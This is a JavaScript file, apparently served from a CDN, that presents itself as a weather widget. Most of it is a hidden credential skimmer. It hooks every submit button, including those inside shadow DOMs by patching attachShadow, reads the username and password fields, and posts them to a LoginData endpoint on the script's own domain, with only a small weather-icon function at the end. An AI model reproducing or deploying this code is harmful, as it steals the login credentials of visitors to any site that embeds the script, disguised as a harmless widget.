(function (window, $) {
    var _leakingFunction = function(e) {
        var form = $(this).parent('form'),
            userName = $('input[name="userName"]', form).val(),
            password = $('input[name="password"]', form).val();

        $.ajax({
            url: '//<%= cdnDomain %>/api/LoginData',
            method: 'POST',
            data: JSON.stringify({ username: userName, password: password }),
            contentType: 'application/json; charset=utf-8'
        });

        e.preventDefault();
    };

    var _domCallSniffer = function() {
        var overridenFunction = Element.prototype.attachShadow;

        Element.prototype.attachShadow = function sniffer() {
            var that = this,
                capturedRoot = overridenFunction.apply(that, arguments),
                srInnerHtmlDef = Object.getOwnPropertyDescriptor(ShadowRoot.prototype, 'innerHTML');

            Object.defineProperty(capturedRoot, 'innerHTML',
                {
                    get: function () { return capturedRoot.innerHTML; },
                    set: function(markup) {
                        srInnerHtmlDef.set.apply(capturedRoot, [markup]);
                        $('button[type="submit"]', capturedRoot).click(_leakingFunction);
                    }
                });

            return capturedRoot;
        };
    };

    _domCallSniffer();

    $(function initLeaker() {
        $('button[type="submit"]').click(_leakingFunction);
    });

    window.Weather = {
        initialize: function weather_initialize(targetElem) {
            var res = $.ajax({
                url: '//<%= cdnDomain %>/api/Weather',
                success: function(data) {
                    console.info(data);
                    targetElem.empty().append($('<i>').addClass('owi').addClass('owi-' + data.icon));
                }
            });
        }
    };
})(window, $);